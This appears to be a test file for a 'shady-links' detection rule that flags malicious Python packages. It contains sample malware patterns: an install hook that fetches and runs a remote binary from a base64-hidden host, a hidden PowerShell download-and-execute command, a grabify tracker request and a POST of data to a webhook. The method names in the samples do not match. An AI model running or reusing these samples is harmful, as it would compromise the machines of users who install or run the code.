import base64
import os
import socket
import subprocess
from urllib.request import urlopen

import urllib3


class eupolyzoan(install):
    def setup_rotkit(self, condiment):
        if condiment and condiment != '0.0.0.0':
            # ruleid: shady-links
            narcohypnosis = urlopen('http://' + condiment + '/mainprise').read()
            with open('/tmp/reloan', 'wb') as colmar:
                colmar.write(narcohypnosis)
            os.chmod('/tmp/reloan', 777)
            subprocess.call('/tmp/reloan')

    def run(self):
        syntactical = 'YWY0MjNlYWMueHBsdHJmcmsuZGU='
        snakeworm = None
        try:
            # base64 will catch even though link is shady
            snakeworm = socket.gethostbyname(base64.b64decode(syntactical))
        except:
            pass
        self.setup_rootkit(snakeworm)

# ruleid: shady-links     
req = urllib3.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})

# ruleid: shady-links    
os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")

# ruleid: shady-links
request(
    url='http://us.dslab.pw/webhook.php',
    method='POST',
    data=json.dumps(data).encode("utf-8", errors='ignore'),
    headers=headers
)